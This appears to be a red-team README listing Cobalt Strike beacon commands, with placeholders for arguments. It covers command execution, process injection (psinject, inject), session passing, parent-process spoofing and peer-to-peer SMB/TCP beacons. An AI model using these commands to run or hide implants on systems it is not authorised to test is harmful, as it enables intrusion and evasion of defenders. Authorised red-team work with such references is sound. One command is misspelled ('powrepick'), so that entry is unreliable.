<p align="center">
  <img width="500" height="100" src="https://github.com/bigb0sss/RedTeam/blob/master/CobaltStrike/cs_logo.png">
</p>

## Command References

### Beacons
#### Sleep
```css
sleep 60 50                                 ; Sleep 60 sec with 50% of jitter (Call back between 30 to 60 secs randomly) 
```

#### Command Execution (Default)
```css
run [command]
```
#### Command Execution (powershell.exe)
```css
powershell-import [/path/to/your.ps1]       ; Running it from your localhost
powershell [cmdlet] [args]
```
#### Command Execution (powerpick - using PS w/o powershell.exe)
```css
powrepick [cmdlet] [args]
```

#### Command Execution (psinject - using PS within another process)
```css
psinject [PID] [x86|x64] [cmdlet] [args]
```

#### Command Execution (.NET)
```css
execute-assembly [/path/to/your.exe]        ; Running it from your localhost
```

#### Command Execution (cmd.exe)
```css
shell [command] [args]
```

#### Session Passing
```css
spawn [x86|x64] [Listener]
inject [PID] [x86|x64] [Listener]
```

#### Parent Process Modification
```css
ppid [Choice of your parent process (e.g., iexplore.exe)]
spawnto [x86|x64] [New parent process]
```

#### SMB Beacn
```css
spawn [SMB-Listner-Name]                    ; Spawning a peer-to-peer ("P2P") SMB beacon 
inject [PID] [x86|x64] [SMB-Listner-Name]   ; Useful when trying to spawn P2P beacon as different user context
```

#### TCP Beacn
```css
spawn [TCP-Listner-Name]                    ; Spawning a peer-to-peer ("P2P") TCP beacon 
                                            ; TCP beacons can be also run locally by clicking "Bind to localhost only" on GUI
inject [PID] [x86|x64] [TCP-Listner-Name]   ; Useful when trying to spawn P2P beacon as different user context
```
